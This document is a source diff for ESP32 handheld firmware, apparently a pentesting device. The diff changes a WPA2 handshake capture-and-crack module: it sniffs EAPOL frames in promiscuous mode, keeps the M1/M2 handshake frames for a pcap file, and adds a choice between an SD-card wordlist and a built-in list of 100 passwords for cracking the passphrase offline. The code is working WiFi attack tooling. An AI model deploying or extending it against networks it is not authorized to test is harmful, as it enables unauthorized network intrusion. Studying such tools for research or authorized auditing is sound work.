@@ -5,7 +5,6 @@
 #include "handshake_capture.h"
 #include "input_handling.h"
 #include "sdcard_manager.h"
-#include "mac_changer.h"
 #include <SD.h>
 #include <mbedtls/pkcs5.h>
 #include <mbedtls/md.h>
@@ -56,6 +55,9 @@ struct WpaHandshake {
     uint8_t  keyDescriptor;     // 0x02 = RSN/WPA2
     bool     hasM1;
     bool     hasM2;
+    // Raw 802.11 frames stored in RAM — written to SD only after WiFi teardown
+    uint8_t  m1Raw[256]; uint16_t m1RawLen; uint32_t m1Ts;
+    uint8_t  m2Raw[256]; uint16_t m2RawLen; uint32_t m2Ts;
 };
 
 static WpaHandshake g_whs;
@@ -335,6 +337,35 @@ void HandshakeCapture::crack() {
     _dm.println(macStr(g_whs.apMac).c_str());
     _dm.printSeparator();
 
+    // ── Wordlist selection ────────────────────────────────────────────────────
+    bool hasWl = sdCardManager.isReady() && SD.exists("/wordlist.txt");
+    bool useSD = hasWl;
+    if (hasWl) {
+        _dm.setCursor(10, _dm.getCursorY());
+        _dm.setTextColor(TFT_GREEN);  _dm.println("[1] /wordlist.txt (SD)");
+        _dm.setCursor(10, _dm.getCursorY());
+        _dm.setTextColor(0x7BEF);    _dm.println("[2] Built-in (100 pwds)");
+        _dm.setCursor(10, _dm.getCursorY());
+        _dm.setTextColor(TFT_WHITE); _dm.println("Choose source:");
+        char ch = 0;
+        while (ch != '1' && ch != '2') ch = inputHandler.getKeyboardInput();
+        useSD = (ch == '1');
+        _dm.clearScreen();
+        _dm.setCursor(10, outputY);
+        _dm.setTextColor(0x7BEF);     _dm.printText("[");
+        _dm.setTextColor(TFT_CYAN);   _dm.printText("HANDSHAKE");
+        _dm.setTextColor(0x7BEF);     _dm.printText("::");
+        _dm.setTextColor(TFT_YELLOW); _dm.println("CRACK]");
+        _dm.printSeparator();
+        _dm.setCursor(10, _dm.getCursorY());
+        _dm.setTextColor(0x7BEF); _dm.printText("SSID  "); _dm.setTextColor(TFT_WHITE);
+        _dm.println(g_whs.ssid);
+        _dm.setCursor(10, _dm.getCursorY());
+        _dm.setTextColor(0x7BEF); _dm.printText("AP    "); _dm.setTextColor(TFT_WHITE);
+        _dm.println(macStr(g_whs.apMac).c_str());
+        _dm.printSeparator();
+    }
+
     int32_t tryY = _dm.getCursorY();
 
     // Initialize mbedtls context once for all tryPassword calls
@@ -342,8 +373,6 @@ void HandshakeCapture::crack() {
     mbedtls_md_init(&mdCtx);
     const mbedtls_md_info_t* sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
     mbedtls_md_setup(&mdCtx, sha1, 1);  // 1 = HMAC mode
-
-    bool     useSD      = sdCardManager.isReady();
     File     wl;
     uint32_t tried      = 0;
     uint32_t skipped    = 0;
@@ -486,22 +515,7 @@ void HandshakeCapture::run(const uint8_t* bssid, int channel, const char* ssid) 
     memcpy(g_whs.apMac, bssid, 6);
     strncpy(g_whs.ssid, ssid, 32);
 
-    // WiFi setup — AP interface needed for 80211_tx injection
-    WiFi.mode(WIFI_MODE_APSTA);
-    MacChanger::getInstance().applyIfEnabled();
-    WiFi.softAP("x", nullptr, channel, 1, 0, false);
-    delay(100);
-
-    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
-    esp_wifi_set_promiscuous_filter(&filt);
-    esp_wifi_set_promiscuous(true);
-    esp_wifi_set_promiscuous_rx_cb(rxCallback);
-    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
-    delay(50);
-
-    g_wsCapturing = true;
-
-    // ── Open pcap file ────────────────────────────────────────────────────────
+    // ── Open pcap file before WiFi — avoids SPI/DMA contention on ESP32-S3 ──────
     bool fileOk = false;
     File pcap;
     if (sdCardManager.isReady()) {
@@ -525,6 +539,20 @@ void HandshakeCapture::run(const uint8_t* bssid, int channel, const char* ssid) 
             pcap.write((uint8_t*)&ghdr, sizeof(ghdr));
         }
     }
+
+    // WiFi setup — AP interface needed for 80211_tx injection
+    WiFi.mode(WIFI_MODE_APSTA);
+    WiFi.softAP("x", nullptr, channel, 1, 0, false);
+    delay(100);
+
+    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(rxCallback);
+    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
+    delay(50);
+
+    g_wsCapturing = true;
 
     // ── UI ────────────────────────────────────────────────────────────────────
     _dm.clearScreen();
@@ -593,6 +621,25 @@ void HandshakeCapture::run(const uint8_t* bssid, int channel, const char* ssid) 
 
     redrawStatus();
 
+    // ── Pcap finalizer — called after WiFi teardown, SD access is safe ────────
+    auto finalizePcap = [&]() {
+        if (!fileOk) return;
+        auto writeRec = [&](const uint8_t* d, uint16_t len, uint32_t ts) {
+            struct __attribute__((packed)) {
+                uint32_t ts_sec; uint32_t ts_usec;
+                uint32_t incl_len; uint32_t orig_len;
+            } rh;
+            rh.ts_sec = ts / 1000; rh.ts_usec = (ts % 1000) * 1000;
+            rh.incl_len = rh.orig_len = len;
+            pcap.write((uint8_t*)&rh, sizeof(rh));
+            pcap.write(d, len);
+        };
+        if (g_whs.m1RawLen > 0) writeRec(g_whs.m1Raw, g_whs.m1RawLen, g_whs.m1Ts);
+        if (g_whs.m2RawLen > 0) writeRec(g_whs.m2Raw, g_whs.m2RawLen, g_whs.m2Ts);
+        pcap.flush();
+        pcap.close();
+    };
+
     // ── Main loop ─────────────────────────────────────────────────────────────
     while (true) {
         char k = inputHandler.getKeyboardInput();
@@ -602,9 +649,9 @@ void HandshakeCapture::run(const uint8_t* bssid, int channel, const char* ssid) 
             g_wsCapturing = false;
             esp_wifi_set_promiscuous_rx_cb(nullptr);
             esp_wifi_set_promiscuous(false);
-            if (fileOk) pcap.close();
             WiFi.softAPdisconnect(true);
-            WiFi.mode(WIFI_OFF);
+            WiFi.mode(WIFI_STA);
+            finalizePcap();
             crack();
             _dm.printCommandScreen();
             return;
@@ -616,47 +663,37 @@ void HandshakeCapture::run(const uint8_t* bssid, int channel, const char* ssid) 
             memcpy(&frame, (const void*)&hsRing[hsTail], sizeof(EapolFrame));
             hsTail = (hsTail + 1) % HS_RING_SIZE;
 
-            // Write pcap record
-            if (fileOk) {
-                struct __attribute__((packed)) {
-                    uint32_t ts_sec; uint32_t ts_usec;
-                    uint32_t incl_len; uint32_t orig_len;
-                } rhdr;
-                rhdr.ts_sec   = frame.ts_ms / 1000;
-                rhdr.ts_usec  = (frame.ts_ms % 1000) * 1000;
-                rhdr.incl_len = rhdr.orig_len = frame.len;
-                pcap.write((uint8_t*)&rhdr, sizeof(rhdr));
-                pcap.write(frame.data, frame.len);
-            }
-
-            // Extract crypto material
+            // Extract crypto material + buffer raw frame (no SD writes during WiFi)
             uint8_t subtype = (frame.data[0] >> 4) & 0x0F;
             int     hdrLen  = (subtype & 0x08) ? 26 : 24;
             const uint8_t* eapol = frame.data + hdrLen + 8;
 
-            // How many EAPOL bytes are actually in the stored (possibly truncated) frame
             uint16_t eapolAvail = (frame.len > (uint16_t)(hdrLen + 8))
                                   ? frame.len - (uint16_t)(hdrLen + 8) : 0;
 
-            // eapolAvail guards all EAPOL field accesses — no out-of-bounds reads
             if (frame.msgNum == 1 && !g_whs.hasM1 && eapolAvail >= 49) {
                 memcpy(g_whs.aNonce, eapol + 17, 32);
-                memcpy(g_whs.clientMac, frame.data + 4, 6); // Addr1 = client (AP→STA)
+                memcpy(g_whs.clientMac, frame.data + 4, 6);
                 g_whs.keyDescriptor = eapol[4];
+                memcpy(g_whs.m1Raw, frame.data, frame.len);
+                g_whs.m1RawLen = frame.len;
+                g_whs.m1Ts     = frame.ts_ms;
                 g_whs.hasM1 = true;
             }
             if (frame.msgNum == 2 && !g_whs.hasM2 && eapolAvail >= 97) {
-                // eapolLen from header, clamped to actual stored bytes
                 uint16_t eapolLen = ((eapol[2] << 8) | eapol[3]) + 4;
                 if (eapolLen > eapolAvail)               eapolLen = eapolAvail;
                 if (eapolLen > sizeof(g_whs.eapolFrame)) eapolLen = sizeof(g_whs.eapolFrame);
                 memcpy(g_whs.sNonce, eapol + 17, 32);
                 memcpy(g_whs.mic, eapol + 81, 16);
                 memcpy(g_whs.eapolFrame, eapol, eapolLen);
-                memset(g_whs.eapolFrame + 81, 0, 16);   // zero MIC field for HMAC
+                memset(g_whs.eapolFrame + 81, 0, 16);
                 g_whs.eapolLen = eapolLen;
-                memcpy(g_whs.clientMac, frame.data + 10, 6); // Addr2 = client (STA→AP)
+                memcpy(g_whs.clientMac, frame.data + 10, 6);
                 g_whs.keyDescriptor = eapol[4];
+                memcpy(g_whs.m2Raw, frame.data, frame.len);
+                g_whs.m2RawLen = frame.len;
+                g_whs.m2Ts     = frame.ts_ms;
                 g_whs.hasM2 = true;
             }
 
@@ -683,8 +720,8 @@ void HandshakeCapture::run(const uint8_t* bssid, int channel, const char* ssid) 
     g_wsCapturing = false;
     esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_set_promiscuous(false);
-    if (fileOk) pcap.close();
     WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_OFF);
+    WiFi.mode(WIFI_STA);
+    if (fileOk) { pcap.flush(); pcap.close(); }
     _dm.printCommandScreen();
 }
